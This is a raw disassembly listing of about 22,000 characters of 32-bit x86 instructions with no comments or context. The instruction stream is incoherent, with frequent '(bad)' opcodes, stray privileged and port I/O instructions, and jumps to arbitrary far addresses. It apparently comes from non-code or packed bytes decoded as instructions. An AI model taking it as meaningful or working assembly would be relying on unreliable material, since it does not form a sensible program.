  41c54d:	cmp    al,0x82
  41c54f:	retf   
  41c550:	fistp  DWORD PTR [edi]
  41c552:	inc    esp
  41c553:	sbb    eax,0x4667422
  41c558:	add    eax,0x461a6174
  41c55d:	stos   DWORD PTR es:[edi],eax
  41c55e:	xchg   edi,eax
  41c55f:	push   DWORD PTR [esi+ecx*1-0x15]
  41c563:	bound  eax,QWORD PTR [ebx+0x77461e8]
  41c569:	pop    es
  41c56a:	je     0x41c5d3
  41c56c:	push   0x5d8276c8
  41c571:	mov    bh,0x5e
  41c573:	jne    0x41c5c5
  41c575:	xor    al,0x81
  41c577:	push   esp
  41c578:	cli    
  41c579:	dec    ebp
  41c57a:	or     edi,ecx
  41c57c:	jmp    0x41c5f8
  41c57e:	fs cwde 
  41c580:	push   ss
  41c581:	sub    al,0x15
  41c583:	pop    esp
  41c584:	mov    ecx,0x909d3203
  41c589:	lahf   
  41c58a:	push   ss
  41c58b:	pusha  
  41c58c:	mov    ecx,0x7c1d7504
  41c591:	scas   al,BYTE PTR es:[edi]
  41c592:	ins    DWORD PTR es:[edi],dx
  41c593:	outs   dx,DWORD PTR ds:[esi]
  41c594:	mov    bh,0xc3
  41c596:	pop    ss
  41c597:	mov    ch,BYTE PTR [esp+esi*1-0xfb77ff]
  41c59e:	sbb    DWORD PTR [ebx*8+0x6c004f40],ebx
  41c5a5:	dec    edx
  41c5a6:	xor    eax,0xdeea7d8b
  41c5ab:	sub    bh,BYTE PTR [eax-0x57]
  41c5ae:	push   0x6615749d
  41c5b3:	cwde   
  41c5b4:	push   es
  41c5b5:	mov    di,0xf971
  41c5b9:	shr    DWORD PTR ds:0x40aeb28,1
  41c5bf:	jbe    0x41c5c5
  41c5c1:	out    dx,eax
  41c5c2:	or     al,0xe1
  41c5c4:	shr    DWORD PTR [edx+0x77e9df8],1
  41c5ca:	nop
  41c5cb:	mov    WORD PTR [ecx+0x384b095b],cs
  41c5d1:	(bad)  
  41c5d2:	mov    BYTE PTR [edx],dl
  41c5d4:	das    
  41c5d5:	sub    ah,cl
  41c5d7:	inc    ecx
  41c5d8:	add    BYTE PTR [edx+0x9703630],cl
  41c5de:	fs out 0x29,al
  41c5e1:	aaa    
  41c5e2:	adc    al,0x90
  41c5e4:	add    esp,esp
  41c5e6:	adc    BYTE PTR [ecx+0x325c9c98],ch
  41c5ec:	shl    BYTE PTR [ebp-0x1bfcfc9b],cl
  41c5f2:	rcl    eax,0x35
  41c5f5:	sub    al,0x73
  41c5f8:	dec    eax
  41c5f9:	lods   eax,DWORD PTR ds:[esi]
  41c5fa:	je     0x41c632
  41c5fc:	ss hlt 
  41c5fe:	add    BYTE PTR [ebp+0x29],dh
  41c601:	mov    ecx,0x83ff0cea
  41c606:	call   0xa050:0x12d14e9d
  41c60d:	pop    ds
  41c60e:	dec    edx
  41c60f:	mov    BYTE PTR ds:0x683acfe,bl
  41c615:	add    al,0x68
  41c617:	dec    ebx
  41c618:	popf   
  41c619:	test   DWORD PTR [esp+ebx*2+0x1023ed8],ecx
  41c620:	ins    BYTE PTR es:[edi],dx
  41c621:	dec    edx
  41c622:	dec    eax
  41c623:	enter  0xc602,0x33
  41c627:	ds mov al,0x67
  41c62a:	sbb    al,0x76
  41c62c:	jae    0x41c63f
  41c62e:	in     al,dx
  41c62f:	nop
  41c630:	mov    esi,0x32100feb
  41c635:	and    ebx,ebx
  41c637:	in     al,0x94
  41c639:	dec    eax
  41c63a:	add    ebp,DWORD PTR [eax+0x28]
  41c63d:	imul   ecx,DWORD PTR [ecx+0x47],0x841a5731
  41c644:	popf   
  41c645:	leave  
  41c646:	pop    esp
  41c647:	dec    edx
  41c648:	into   
  41c649:	jo     0x41c691
  41c64b:	dec    ecx
  41c64c:	jo     0x41c691
  41c64e:	pop    edx
  41c64f:	mov    dl,bl
  41c651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c652:	pop    eax
  41c653:	mov    bl,0xd8
  41c655:	push   es
  41c656:	mov    ?,ebx
  41c658:	div    esp
  41c65a:	add    BYTE PTR [ebx],cl
  41c65c:	inc    edx
  41c65d:	inc    edx
  41c65e:	pop    edx
  41c65f:	or     BYTE PTR [esi+0x74b341f4],0xdb
  41c666:	sub    DWORD PTR [edx],edx
  41c668:	push   es
  41c669:	call   0x75c2ac79
  41c66e:	adc    eax,0x76
  41c671:	rol    ah,cl
  41c673:	mov    eax,0x744e7497
  41c678:	fld    QWORD PTR [ebx]
  41c67a:	mov    WORD PTR [edi],es
  41c67c:	cmp    BYTE PTR ds:0x9d348110,0xc6
  41c683:	inc    esi
  41c684:	out    0x92,al
  41c686:	jae    0x905f52b1
  41c68c:	ret    
  41c68d:	xchg   esi,eax
  41c68e:	add    al,0x7b
  41c690:	and    DWORD PTR [ebx+ebp*8-0x4adbcf9b],ecx
  41c697:	and    esp,esp
  41c699:	jmp    0x41c6ba
  41c69b:	push   es
  41c69c:	loopne 0x41c6a9
  41c69e:	mov    ds:0x8f64a3ad,al
  41c6a3:	inc    eax
  41c6a4:	push   es
  41c6a5:	or     al,0x80
  41c6a7:	xchg   DWORD PTR [esi],ebp
  41c6a9:	jo     0x41c63a
  41c6ab:	jae    0x41c6d2
  41c6ad:	nop
  41c6ae:	shl    esp,1
  41c6b0:	mov    eax,0x8bf9259d
  41c6b5:	push   ss
  41c6b6:	sub    edx,DWORD PTR [ebp-0x24]
  41c6b9:	and    DWORD PTR [esi],edx
  41c6bb:	sub    ch,bl
  41c6bd:	adc    ch,BYTE PTR [eax]
  41c6bf:	fimul  WORD PTR [edx+0xc]
  41c6c3:	sbb    al,0x94
  41c6c5:	(bad)  
  41c6c7:	cmp    ah,BYTE PTR [eax]
  41c6c9:	jno    0x41c669
  41c6cb:	inc    ebx
  41c6cc:	mov    dl,cl
  41c6ce:	or     DWORD PTR [ebp-0x1c],0xc0051889
  41c6d5:	jb     0x41c6a6
  41c6d7:	push   esp
  41c6d8:	loop   0x41c729
  41c6da:	or     bl,BYTE PTR [eax]
  41c6dc:	jmp    0x41c6f3
  41c6de:	inc    ecx
  41c6df:	dec    ebp
  41c6e0:	das    
  41c6e1:	push   eax
  41c6e2:	dec    ebp
  41c6e3:	into   
  41c6e4:	mov    ebp,0x60139ad
  41c6e9:	add    ecx,DWORD PTR [ebp+0xa]
  41c6ec:	or     eax,DWORD PTR [eax]
  41c6ee:	push   ss
  41c6ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6f0:	stos   BYTE PTR es:[edi],al
  41c6f1:	pusha  
  41c6f2:	pop    es
  41c6f3:	jge    0x41c6d4
  41c6f5:	cmp    ch,BYTE PTR [ebx+0x3f87220]
  41c6fb:	test   DWORD PTR [esp+eax*2-0x11],ecx
  41c6ff:	popf   
  41c700:	jnp    0x41c709
  41c702:	adc    eax,0x4f87b3b5
  41c707:	fsub   DWORD PTR [edx]
  41c709:	ret    
  41c70a:	cmp    ebp,ebx
  41c70c:	or     al,0x55
  41c70e:	pop    ebp
  41c70f:	ror    BYTE PTR ds:0x168bd12d,1
  41c715:	and    BYTE PTR [eax+ecx*1],0x8d
  41c719:	fistp  WORD PTR [ecx+0x45]
  41c71c:	call   0x8972f51
  41c721:	pop    edi
  41c722:	inc    ebx
  41c723:	pop    esi
  41c724:	aad    0xac
  41c726:	pop    bx
  41c728:	cmp    BYTE PTR [edx+0x18],al
  41c72b:	lods   al,BYTE PTR ds:[esi]
  41c72c:	loopne 0x41c743
  41c72e:	xchg   ebp,eax
  41c72f:	sbb    dl,bh
  41c731:	pop    ds
  41c732:	lock dec ecx
  41c734:	inc    eax
  41c735:	sub    ecx,DWORD PTR [esi]
  41c737:	daa    
  41c738:	cmp    ebx,eax
  41c73a:	jg     0x41c75d
  41c73c:	add    edi,edi
  41c73e:	push   esi
  41c73f:	adc    eax,0x7420ff1e
  41c744:	in     eax,dx
  41c745:	mov    DWORD PTR [edi],ebx
  41c747:	lahf   
  41c748:	ret    
  41c749:	(bad)  
  41c74a:	fs shl esp,1
  41c74d:	or     al,bh
  41c74f:	mov    ebx,0xf4b6a6f7
  41c754:	cmp    al,bl
  41c756:	(bad)  
  41c757:	lods   al,BYTE PTR ds:[esi]
  41c758:	push   cs
  41c759:	(bad)  
  41c75a:	dec    esp
  41c75b:	test   al,0x5d
  41c75d:	or     DWORD PTR [edx-0x30],edx
  41c760:	lods   eax,DWORD PTR ds:[esi]
  41c761:	cmc    
  41c762:	sbb    esi,DWORD PTR [ebx]
  41c764:	test   bl,0x45
  41c767:	add    eax,eax
  41c769:	out    0xbd,al
  41c76b:	push   eax
  41c76c:	mov    bh,0x80
  41c76e:	les    edx,FWORD PTR [edi+ebx*1-0x11]
  41c772:	jmp    0x1ad6:0xc87d6630
  41c779:	pop    ds
  41c77a:	pusha  
  41c77b:	pop    esp
  41c77c:	(bad)  
  41c77d:	adc    DWORD PTR [edx-0x7d83febc],ecx
  41c783:	mov    edi,0x2cd00418
  41c788:	or     dh,BYTE PTR [ebx+0x7]
  41c78b:	cmc    
  41c78c:	jb     0x41c75b
  41c78e:	aam    0x5f
  41c790:	stos   DWORD PTR es:[edi],eax
  41c791:	jbe    0x41c7c4
  41c793:	sbb    BYTE PTR [esi-0x5],bh
  41c796:	dec    esi
  41c797:	adc    ch,BYTE PTR [edx]
  41c799:	ret    0x1db8
  41c79c:	mov    al,0xdb
  41c79e:	ror    DWORD PTR [eax+0x18891402],cl
  41c7a4:	sub    eax,0xa06f3089
  41c7a9:	and    eax,0xf77606d1
  41c7ae:	fild   DWORD PTR [eax-0x60db7bee]
  41c7b4:	in     al,0x54
  41c7b6:	mov    edi,DWORD PTR [esp+ebp*1]
  41c7b9:	lahf   
  41c7ba:	sbb    DWORD PTR [ecx],0x19
  41c7bd:	add    al,0xc4
  41c7bf:	fcom   QWORD PTR [ebx+0x6c]
  41c7c2:	(bad)  
  41c7c3:	dec    eax
  41c7c4:	mov    eax,ds:0xcc1475e8
  41c7c9:	sub    al,BYTE PTR [ebp+0xe16168d]
  41c7cf:	les    esi,FWORD PTR [ebx+0x74]
  41c7d2:	mov    DWORD PTR [ebp-0x17f6cfeb],edx
  41c7d8:	xor    DWORD PTR ds:0x60120bd,0xffffffb3
  41c7df:	add    DWORD PTR [edx+0x2f239231],ecx
  41c7e5:	and    DWORD PTR [eax],0x2d
  41c7e8:	xor    bl,bh
  41c7ea:	test   al,0x3a
  41c7ec:	adc    ah,BYTE PTR [ebx+0x51]
  41c7ef:	mov    BYTE PTR [eax+esi*8],cl
  41c7f2:	jae    0x41c77b
  41c7f4:	lock pop esi
  41c7f6:	inc    eax
  41c7f7:	aas    
  41c7f8:	outs   dx,BYTE PTR ds:[esi]
  41c7f9:	dec    ebp
  41c7fa:	pop    es
  41c7fb:	push   esp
  41c7fc:	outs   dx,DWORD PTR ds:[esi]
  41c7fd:	or     edx,DWORD PTR [esi+edi*2+0x7]
  41c801:	repnz push es
  41c803:	(bad)  
  41c804:	cmp    al,BYTE PTR [eax]
  41c806:	inc    edi
  41c807:	rcr    BYTE PTR [ebx],1
  41c809:	pusha  
  41c80a:	add    al,0xff
  41c80c:	pop    es
  41c80d:	js     0x41c84c
  41c80f:	adc    BYTE PTR [ebp-0x4e],bl
  41c812:	dec    edi
  41c813:	xor    DWORD PTR [edi-0x1ddd673],edi
  41c819:	outs   dx,DWORD PTR ds:[esi]
  41c81a:	mov    cl,0x22
  41c81c:	ds hlt 
  41c81e:	fild   QWORD PTR [esp+eax*2]
  41c821:	je     0x41c83d
  41c823:	dec    al
  41c825:	je     0x41c831
  41c827:	sub    al,0xad
  41c829:	sti    
  41c82a:	lea    edx,[edi+0x740c2c53]
  41c830:	test   BYTE PTR [eax],dl
  41c832:	mov    bl,0x2
  41c834:	jmp    0x41c850
  41c836:	add    edx,DWORD PTR [esi]
  41c838:	sub    dh,ch
  41c83a:	ret    
  41c83b:	ficomp WORD PTR [edx]
  41c83d:	nop
  41c83e:	cmp    ebp,ebx
  41c840:	push   cs
  41c841:	inc    edi
  41c842:	pop    eax
  41c843:	clc    
  41c844:	jle    0x41c812
  41c846:	outs   dx,BYTE PTR ds:[esi]
  41c847:	and    ah,BYTE PTR [esi-0x48]
  41c84a:	jp     0x41c7d3
  41c84c:	sti    
  41c84d:	test   BYTE PTR cs:[esp+esi*8+0x6a032036],0x0
  41c856:	or     eax,0xac32138b
  41c85b:	test   eax,0x99e3110
  41c860:	add    al,BYTE PTR [ebx]
  41c862:	aas    
  41c863:	and    ah,BYTE PTR [edx]
  41c865:	int3   
  41c866:	add    edi,DWORD PTR ds:[esp+ecx*1+0x2d]
  41c86b:	mov    edx,eax
  41c86d:	pop    es
  41c86e:	lock leave 
  41c870:	das    
  41c871:	push   ebp
  41c872:	push   ecx
  41c873:	mov    ebp,eax
  41c875:	lea    edi,[edi-0xa245557]
  41c87b:	push   ecx
  41c87c:	mov    ebx,0x4be486a
  41c881:	sub    ebx,DWORD PTR fs:[ebx]
  41c884:	cmp    eax,DWORD PTR [ebx-0x3a74d648]
  41c88a:	lea    eax,[ebx]
  41c88c:	pop    es
  41c88d:	pop    edx
  41c88e:	add    eax,0xb410c289
  41c893:	lahf   
  41c894:	mov    eax,fs
  41c896:	ficomp DWORD PTR [esi-0x38]
  41c899:	add    al,0xf1
  41c89b:	jmp    0x41c8a6
  41c89d:	inc    esi
  41c89e:	call   0x81143df2
  41c8a3:	pop    es
  41c8a4:	loope  0x41c8a6
  41c8a6:	stos   DWORD PTR es:[edi],eax
  41c8a7:	xor    ah,dh
  41c8a9:	aas    
  41c8aa:	push   esi
  41c8ab:	shl    DWORD PTR [ebx],0x55
  41c8ae:	cmp    al,0x12
  41c8b0:	jne    0x41c8ec
  41c8b2:	cmp    ebx,0x63
  41c8b5:	jg     0x41c8db
  41c8b7:	jg     0x41c8c3
  41c8b9:	dec    esp
  41c8ba:	lock dec esi
  41c8bc:	mov    esp,0x3399e732
  41c8c1:	ret    0xd12b
  41c8c4:	aas    
  41c8c5:	mov    bh,0xe0
  41c8c7:	ret    0xc803
  41c8ca:	and    DWORD PTR [eax+eax*1+0x6b],0xd80364c0
  41c8d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8d3:	out    dx,eax
  41c8d4:	push   ss
  41c8d5:	cli    
  41c8d6:	mov    ch,0x78
  41c8d8:	cld    
  41c8d9:	pushf  
  41c8da:	push   cs
  41c8db:	or     bh,dh
  41c8dd:	pop    eax
  41c8de:	cld    
  41c8df:	jmp    0x41c8e7
  41c8e1:	jb     0x41c946
  41c8e3:	xor    ah,al
  41c8e5:	(bad)  [eax-0x4]
  41c8e8:	xor    al,BYTE PTR [ebx]
  41c8ea:	ret    
  41c8eb:	outs   dx,DWORD PTR ds:[esi]
  41c8ec:	fadd   DWORD PTR [edi]
  41c8ee:	stos   DWORD PTR es:[edi],eax
  41c8ef:	fld    DWORD PTR gs:[esi]
  41c8f2:	fadd   DWORD PTR [edx]
  41c8f4:	fsubr  st(0),st
  41c8f6:	in     al,0x19
  41c8f8:	lea    esp,[eax-0x44]
  41c8fb:	fs clc 
  41c8fd:	xchg   ebx,eax
  41c8ff:	adc    BYTE PTR [esi+0x6c17286],cl
  41c905:	pop    ebp
  41c906:	out    dx,al
  41c907:	jb     0x41c8a9
  41c909:	ret    
  41c90a:	jp     0x41c8c0
  41c90c:	sbb    dl,BYTE PTR [ebp+ebp*4-0x38]
  41c910:	iret   
  41c911:	pop    edi
  41c912:	dec    edi
  41c913:	mov    ch,0xc4
  41c915:	and    DWORD PTR [eax+0x78],0xfffffff6
  41c919:	and    DWORD PTR [ebx+0x5ea28468],eax
  41c91f:	mov    ch,BYTE PTR ds:0x67f01a3e
  41c925:	jne    0x41c95b
  41c927:	push   es
  41c928:	ja     0x41c8ea
  41c92a:	mov    bl,0xcb
  41c92c:	sub    DWORD PTR [edi+edi*4+0x17490b8b],0xffffffb1
  41c934:	push   eax
  41c935:	fwait
  41c936:	jno    0x41c8fe
  41c938:	inc    eax
  41c939:	adc    bl,BYTE PTR [esi+0x7ee114e4]
  41c93f:	out    dx,al
  41c940:	inc    ecx
  41c941:	int    0x7
  41c943:	xor    esp,0x44
  41c946:	adc    BYTE PTR [edi+0x15a4b7dc],bh
  41c94c:	ds mov eax,0x449e597f
  41c952:	or     edi,DWORD PTR [esi]
  41c954:	jne    0x41c90e
  41c956:	cwde   
  41c957:	or     BYTE PTR [ecx-0x14ba55b8],ah
  41c95d:	jae    0x41c9ca
  41c95f:	add    DWORD PTR [esi],ebx
  41c961:	ins    BYTE PTR es:[edi],dx
  41c962:	hlt    
  41c963:	push   esi
  41c964:	or     BYTE PTR [eax],0x84
  41c967:	mov    edi,0x7b3b3731
  41c96c:	stos   BYTE PTR es:[edi],al
  41c96d:	call   0x1628:0x6d81f410
  41c974:	adc    edx,edx
  41c976:	ins    BYTE PTR es:[edi],dx
  41c977:	out    0x1a,al
  41c979:	cs jmp 0x205e:0x79a402f2
  41c981:	into   
  41c982:	add    cl,ch
  41c984:	lock fdivr DWORD PTR [eax-0x15]
  41c988:	shl    DWORD PTR es:[ecx+0x12ce08a],cl
  41c98f:	jb     0x41c9ea
  41c991:	and    bl,ch
  41c993:	mov    dh,0x2e
  41c995:	out    dx,al
  41c996:	popa   
  41c997:	cmp    ch,bl
  41c999:	push   edx
  41c99a:	push   esi
  41c99b:	lock adc ch,cl
  41c99e:	imul   al
  41c9a0:	add    WORD PTR [ecx+eax*1+0x71ed90c],bx
  41c9a8:	xor    eax,ecx
  41c9aa:	and    BYTE PTR [ebx],dl
  41c9ac:	imul   bl
  41c9ae:	ss sbb esi,edx
  41c9b1:	hlt    
  41c9b2:	into   
  41c9b3:	test   DWORD PTR [ecx*8-0xf140be6],ebp
  41c9ba:	cmp    edx,DWORD PTR [edi]
  41c9bc:	syscall 
  41c9be:	cli    
  41c9bf:	scas   al,BYTE PTR es:[edi]
  41c9c0:	push   ebp
  41c9c1:	jg     0x41ca3a
  41c9c3:	test   BYTE PTR [eax+0x1b],cl
  41c9c6:	mov    ch,0x58
  41c9c8:	stos   BYTE PTR es:[edi],al
  41c9c9:	pop    ecx
  41c9ca:	stc    
  41c9cb:	jo     0x41c985
  41c9cd:	xor    DWORD PTR [edi-0x72],esi
  41c9d0:	inc    eax
  41c9d1:	xor    al,0x84
  41c9d3:	push   0xffffffef
  41c9d5:	imul   edx,eax,0x10c1a12b
  41c9db:	sbb    ch,bl
  41c9dd:	push   ecx
  41c9de:	in     al,dx
  41c9df:	inc    eax
  41c9e0:	out    dx,al
  41c9e1:	rcr    ebx,0x88
  41c9e4:	xchg   esi,eax
  41c9e5:	and    eax,0x8b1b3df1
  41c9ea:	jge    0x41ca67
  41c9ec:	mov    bh,0x52
  41c9ee:	cmp    al,0x40
  41c9f0:	cmp    ecx,eax
  41c9f2:	jle    0x41ca29
  41c9f4:	adc    bh,al
  41c9f6:	fs jmp 0x41ca28
  41c9f9:	cmp    cl,BYTE PTR [ecx+0x6c]
  41c9fc:	fcom   DWORD PTR [esi]
  41c9fe:	pop    ebx
  41c9ff:	inc    edi
  41ca00:	neg    BYTE PTR [edx+0x12]
  41ca03:	test   DWORD PTR [ecx+0x24],edi
  41ca06:	mov    WORD PTR [esp+esi*1-0x6ec44e1],gs
  41ca0d:	ins    BYTE PTR es:[edi],dx
  41ca0e:	xor    BYTE PTR [ecx],ah
  41ca10:	add    al,0x64
  41ca12:	in     al,0x57
  41ca14:	inc    esp
  41ca15:	dec    ebx
  41ca16:	jo     0x41ca21
  41ca18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca19:	mov    bl,0x9b
  41ca1b:	call   0x624efc5f
  41ca20:	push   ecx
  41ca21:	call   0x4a6d:0x1ab59b54
  41ca28:	ret    0x1148
  41ca2b:	adc    dh,ah
  41ca2d:	xrelease xchg DWORD PTR [esi+0x21728165],ecx
  41ca34:	cmp    cl,BYTE PTR [ecx]
  41ca36:	and    eax,DWORD PTR [esi]
  41ca38:	pop    eax
  41ca39:	mov    eax,0xea75d92c
  41ca3e:	pusha  
  41ca3f:	sbb    al,0x54
  41ca41:	sbb    ah,0x35
  41ca44:	sub    DWORD PTR [esi-0x6e],edx
  41ca47:	jmp    FWORD PTR [ebp-0x7f]
  41ca4a:	mov    dl,0xfd
  41ca4c:	sbb    dh,dh
  41ca4e:	ins    BYTE PTR es:[edi],dx
  41ca4f:	fcom   QWORD PTR [edi]
  41ca51:	outs   dx,DWORD PTR ds:[esi]
  41ca52:	je     0x41ca7e
  41ca54:	sub    eax,ebx
  41ca56:	lods   al,BYTE PTR ds:[esi]
  41ca57:	popa   
  41ca58:	push   edi
  41ca59:	xor    dl,BYTE PTR [eax+ebx*8+0x11ae9917]
  41ca60:	push   es
  41ca61:	pusha  
  41ca62:	test   BYTE PTR [ecx],dl
  41ca64:	dec    edx
  41ca65:	stc    
  41ca66:	rcr    BYTE PTR [edx+0x38],0xd6
  41ca6a:	push   ebp
  41ca6b:	out    dx,al
  41ca6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca6d:	jae    0x41cac3
  41ca6f:	xor    edi,0x2bc185a4
  41ca75:	ja     0x41c9fe
  41ca77:	retf   0x784c
  41ca7a:	jl     0x41ca3d
  41ca7c:	and    BYTE PTR [esi],ah
  41ca7e:	cmp    DWORD PTR [eax],0xda00a7c3
  41ca84:	pop    ss
  41ca85:	xchg   ebx,eax
  41ca86:	gs sub al,0x64
  41ca89:	add    BYTE PTR [ecx+0x5ba435ca],ah
  41ca8f:	ret    0x8e0a
  41ca92:	hlt    
  41ca93:	sbb    bh,al
  41ca95:	or     edi,0xffffffff
  41ca98:	xor    eax,0x82eea70d
  41ca9d:	pushf  
  41ca9e:	mov    dh,0x6a
  41caa0:	pop    ebx
  41caa1:	or     ah,BYTE PTR [esi]
  41caa3:	adc    dl,BYTE PTR [edx]
  41caa5:	mov    ecx,0xbd8d0b2
  41caaa:	add    al,0xc9
  41caac:	adc    DWORD PTR [ebx],ecx
  41caae:	(bad)  
  41caaf:	jmp    0x41cadb
  41cab1:	sub    cl,dl
  41cab3:	and    eax,0xdc943253
  41cab8:	add    eax,0xcd02e681
  41cabd:	scas   eax,DWORD PTR es:[edi]
  41cabe:	add    BYTE PTR [esp+edi*2+0x518bc509],cl
  41cac5:	sub    eax,0x50903000
  41caca:	popf   
  41cacb:	sahf   
  41cacc:	xor    DWORD PTR [ebx],edi
  41cace:	imul   edx,DWORD PTR [ecx],0xffffffa3
  41cad1:	inc    ebp
  41cad2:	add    DWORD PTR [edx+edx*8+0x1ab67271],ebx
  41cad9:	push   es
  41cada:	push   es
  41cadb:	or     BYTE PTR [edx],cl
  41cadd:	out    0xd6,eax
  41cadf:	in     al,0xb0
  41cae1:	cmp    DWORD PTR [esp+ecx*4],0xffffff8b
  41cae5:	lds    esi,FWORD PTR [esp+esi*2+0x41]
  41cae9:	or     al,BYTE PTR [edi+0x327601c]
  41caef:	add    DWORD PTR [edi+eax*2],ebp
  41caf2:	or     al,0x4b
  41caf4:	cmp    DWORD PTR es:[ecx],esp
  41caf7:	(bad)  
  41caf8:	add    BYTE PTR [edi-0x39],bh
  41cafb:	es in  al,0x90
  41cafe:	sbb    cl,BYTE PTR [esi]
  41cb00:	test   eax,0xa8537dc2
  41cb05:	jp     0x41cb48
  41cb07:	or     BYTE PTR [ecx],bl
  41cb09:	and    al,0x66
  41cb0b:	xchg   DWORD PTR [edi],esp
  41cb0d:	(bad)  
  41cb0e:	jge    0x41caa1
  41cb10:	je     0x41cb58
  41cb12:	pop    es
  41cb13:	or     al,0x77
  41cb15:	ds jne 0x41cb1f
  41cb18:	pop    es
  41cb19:	xor    al,0x92
  41cb1b:	loopne 0x41cab7
  41cb1d:	add    al,0x1
  41cb1f:	push   cs
  41cb20:	cmp    eax,0xd70e6a02
  41cb25:	xor    dl,BYTE PTR ds:0xa8111986
  41cb2b:	mov    ah,0xab
  41cb2d:	pop    esi
  41cb2e:	imul   eax,DWORD PTR [edx],0x54
  41cb31:	lods   eax,DWORD PTR ds:[esi]
  41cb32:	adc    al,0x66
  41cb34:	jb     0x41cb82
  41cb36:	adc    BYTE PTR [eax+eax*1+0x2474c74c],ch
  41cb3d:	test   BYTE PTR [ebx+0x476f4359],cl
  41cb43:	mov    BYTE PTR [ecx],bl
  41cb45:	lds    ecx,FWORD PTR [ebx+0x14662379]
  41cb4b:	arpl   WORD PTR [ebp+0x2ccec989],dx
  41cb51:	ins    DWORD PTR es:[edi],dx
  41cb52:	(bad)  
  41cb53:	xlat   BYTE PTR ds:[ebx]
  41cb54:	xchg   ebp,eax
  41cb55:	push   cs
  41cb56:	xchg   ebp,eax
  41cb57:	or     al,0xa
  41cb59:	leave  
  41cb5a:	sbb    al,0x7c
  41cb5c:	or     eax,DWORD PTR [esi]
  41cb5e:	addr16 push ecx
  41cb60:	inc    esi
  41cb61:	pop    edx
  41cb62:	scas   eax,DWORD PTR es:[edi]
  41cb63:	push   esi
  41cb64:	add    al,0x6b
  41cb66:	lock pusha 
  41cb68:	call   0x617a5353
  41cb6d:	and    al,0x0
  41cb6f:	or     al,0x2f
  41cb71:	data16 adc al,0xcc
  41cb74:	dec    ecx
  41cb75:	outs   dx,BYTE PTR ds:[esi]
  41cb76:	fld    QWORD PTR ss:[esi+eax*8-0x7c]
  41cb7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb7c:	sbb    eax,0x7e24c68b
  41cb81:	inc    ecx
  41cb82:	mov    edx,0x61101c1e
  41cb87:	jne    0x41cb96
  41cb89:	and    eax,0xc3f86143
  41cb8e:	or     ebx,eax
  41cb90:	jmp    0x41cbb9
  41cb92:	fucomp st(2)
  41cb94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb95:	fdiv   DWORD PTR [edi-0x21]
  41cb98:	mov    bl,BYTE PTR gs:[edx+esi*2+0x55dc0e0d]
  41cba0:	fstp   QWORD PTR [edi]
  41cba2:	fwait
  41cba3:	jmp    0x41cbb0
  41cba5:	or     al,0x3
  41cba7:	cmc    
  41cba8:	mov    esi,0x18d464c8
  41cbad:	shl    DWORD PTR [ebp-0x5eba73bb],cl
  41cbb3:	and    eax,0x135adaee
  41cbb8:	add    dh,cl
  41cbba:	mov    dl,0x89
  41cbbc:	(bad)  
  41cbbd:	push   edx
  41cbbe:	or     esi,DWORD PTR [ebp+0x4d807918]
  41cbc4:	xor    bh,BYTE PTR [eax+0x45a25fd2]
  41cbca:	adc    ecx,DWORD PTR [esi+ecx*1]
  41cbcd:	xchg   DWORD PTR [ebp-0x80],esi
  41cbd0:	jmp    0xb62d:0x76227221
  41cbd7:	repnz add al,0xd
  41cbda:	rol    BYTE PTR [esi+0x291691cb],cl
  41cbe0:	loopne 0x41cc2f
  41cbe2:	cmp    BYTE PTR gs:[ebx+0x4d],bh
  41cbe6:	loop   0x41cbc1
  41cbe8:	xchg   DWORD PTR [edx-0x50],esp
  41cbeb:	pop    ebp
  41cbec:	or     BYTE PTR [eax-0x73],dl
  41cbef:	add    BYTE PTR [edx+0x74],al
  41cbf2:	jns    0x474a177b
  41cbf8:	adc    al,cl
  41cbfa:	or     DWORD PTR [ecx],0x35
  41cbfd:	mov    eax,ds:0xa2ecae63
  41cc02:	inc    ebx
  41cc03:	rol    DWORD PTR [ebp-0x50],1
  41cc06:	(bad)  
  41cc07:	mov    eax,ds:0x49117cbc
  41cc0c:	maskmovq mm3,mm1
  41cc0f:	clc    
  41cc10:	push   0x2
  41cc12:	push   0xfed61e2
  41cc17:	inc    eax
  41cc18:	add    eax,0x8802208a
  41cc1d:	or     DWORD PTR [ecx-0x70],eax
  41cc20:	cld    
  41cc21:	ret    
  41cc22:	or     si,0xffe0
  41cc26:	ror    DWORD PTR [edi+0x74],0x53
  41cc2a:	(bad)  
  41cc2b:	adc    BYTE PTR [eax+0x33d8e803],ch
  41cc31:	leave  
  41cc32:	push   edx
  41cc33:	mov    ch,al
  41cc35:	fwait
  41cc36:	or     eax,0x21eb5017
  41cc3b:	sub    al,0xb8
  41cc3d:	popa   
  41cc3e:	lahf   
  41cc3f:	fistp  DWORD PTR [esi+0x10]
  41cc42:	xor    BYTE PTR [ebp+0x5126af],0x62
  41cc49:	repnz or al,0xde
  41cc4c:	inc    edx
  41cc4d:	jecxz  0x41cbdb
  41cc4f:	scas   eax,DWORD PTR es:[edi]
  41cc50:	je     0x41cbd2
  41cc52:	sbb    al,0x3c
  41cc54:	cdq    
  41cc55:	pusha  
  41cc56:	loop   0x41cc9d
  41cc58:	mov    esp,0xa00311db
  41cc5d:	mov    edi,0x6a55d004
  41cc62:	or     ebx,DWORD PTR [esi+0x8]
  41cc65:	sbb    cl,al
  41cc67:	sub    eax,0x8d4f7c77
  41cc6c:	inc    ebx
  41cc6d:	inc    esp
  41cc6e:	inc    ebx
  41cc6f:	add    esi,ebp
  41cc71:	and    bh,BYTE PTR [edi+0x5f595c8b]
  41cc77:	mov    DWORD PTR [esp+ecx*4+0x22c3b98c],ecx
  41cc7e:	lock lods al,BYTE PTR ds:[esi]
  41cc80:	cmp    BYTE PTR [edx],dl
  41cc82:	(bad)
  41cc85:	lock mov eax,edi
  41cc88:	inc    ebx
  41cc89:	and    DWORD PTR [ebx-0x1f760279],ebx
  41cc8f:	sti    
  41cc90:	or     eax,0x5760ae75
  41cc95:	add    BYTE PTR [edi+0x1c],dl
  41cc98:	sub    eax,0x2e6d060a
  41cc9d:	add    eax,0x332a0783
  41cca2:	mov    dl,0x6c
  41cca4:	dec    ebx
  41cca5:	push   es
  41cca6:	in     al,dx
  41cca7:	fmul   QWORD PTR [ebx+0x72]
  41ccaa:	fmul   DWORD PTR [esi]
  41ccac:	mov    bh,0xc0
